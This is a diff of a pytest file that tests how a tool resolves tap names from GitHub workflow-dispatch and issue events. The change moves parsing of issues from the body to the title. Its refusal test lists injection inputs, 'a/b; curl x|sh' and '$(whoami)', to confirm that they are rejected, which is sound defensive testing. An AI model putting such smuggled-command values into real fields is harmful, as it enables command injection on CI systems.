@@ -19,15 +19,15 @@ def test_dispatch_registers_a_new_tap():
     assert resolve.resolve("workflow_dispatch", base=REGISTRY, head=REGISTRY, dispatch_tap="a/b") == (["a/b"], None)
 
 
-def test_issue_reads_the_tap_line():
-    taps, register = resolve.resolve("issues", base=REGISTRY, head=REGISTRY, issue_body="Tap: saffsanity/sill\nwhy")
+def test_issue_reads_the_tap_from_its_title():
+    taps, register = resolve.resolve("issues", base=REGISTRY, head=REGISTRY, issue_title="Add tap: saffsanity/sill")
     assert (taps, register) == (["saffsanity/sill"], "saffsanity/sill")
 
 
 @pytest.mark.parametrize("event,kwargs", [
     ("workflow_dispatch", {"dispatch_tap": "a/b; curl x|sh"}),
-    ("issues", {"issue_body": "Tap: $(whoami)/x"}),
-    ("issues", {"issue_body": "no tap here"}),
+    ("issues", {"issue_title": "Add tap: $(whoami)/x"}),
+    ("issues", {"issue_title": "no tap here"}),
 ])
 def test_bad_requests_are_refused(event, kwargs):
     with pytest.raises(SystemExit):
